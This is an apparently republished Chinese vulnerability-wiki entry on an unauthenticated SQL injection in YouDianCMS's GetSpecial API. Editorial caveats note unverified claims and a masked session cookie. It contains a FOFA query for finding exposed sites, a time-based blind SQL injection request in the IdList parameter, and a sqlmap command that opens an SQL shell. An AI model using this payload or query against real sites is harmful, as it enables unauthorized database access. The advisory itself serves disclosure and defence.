---

source: "SourByte05/Vulnerability-Wiki-PoC"
product: "YouDianCMS/友点CMS"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "友点CMS GetSpecial SQL注入"
prerequisites: "来源所述条件，未列明部分仍待核：APIGetSpecial reachable;debug1potential prerequisite; IdListstringSQL; versionsunspecified"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-cccc62618d7b74a9ce2ed300"
entity_id: "ve-cccc62618d7b74a9ce2ed300"
schema_version: "1"
---

## 核对与使用边界

- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：APIGetSpecial reachable;debug1potential prerequisite; IdListstringSQL; versionsunspecified

- **事实待核（1）**：产品应并入YouDianCMS而非另友点目录。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **凭据与会话边界（2）**：Host127.0.01错字、裸请求/SQLmap无代码围栏，Cookie有但鉴权未解释。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。

- **适用与权限边界（3）**：在野已知/深入获取服务器权限无来源及链前提。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **事实待核（4）**：官方修复标题下通用建议无官方依据；加密用户内容和多次过滤不替代参数化/数值列表验证。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **事实待核（5）**：需版本、实际SQL上下文和debug开关是否影响回显。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# 关于友点CMS GetSpecial SQL注入漏洞预警

# 漏洞描述

友点CMS建站系统GetSpecial 接口处存在SQL注入漏洞，未经身份认证的攻击者可以利用该漏洞获取系统数据库敏感信息，深入利用可获取服务器权限。

# 影响范围

友点CMS

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 中 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：app="友点建站-CMS"

POC/EXP：

GET /index.php/api/GetSpecial?debug=1&ChannelID=1&IdList=1,1%29%20and%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%283%29%29%29A HTTP/1.1
Host: 127.0.01
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=bdm********************3c6
Connection: close

![image-20240222152242221](./.resource/友点CMSGetSpecialSQL注入/media/image-20240222152242221.png)


sqlmap验证

sqlmap.py -u "http://127.0.0.1/index.php/api/GetSpecial?debug=1&ChannelID=1&IdList=1,1*" --sql-shell

![image-20240222151646143](./.resource/友点CMSGetSpecialSQL注入/media/image-20240222151646143.png)


# 修复方案

**官方修复：**

关闭互联网暴露面设置接口访问控制。

对用户提交数据信息严格把关，多次筛选过滤。

对用户数据内容进行加密，采用SQL语句预编译和绑定变量。


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
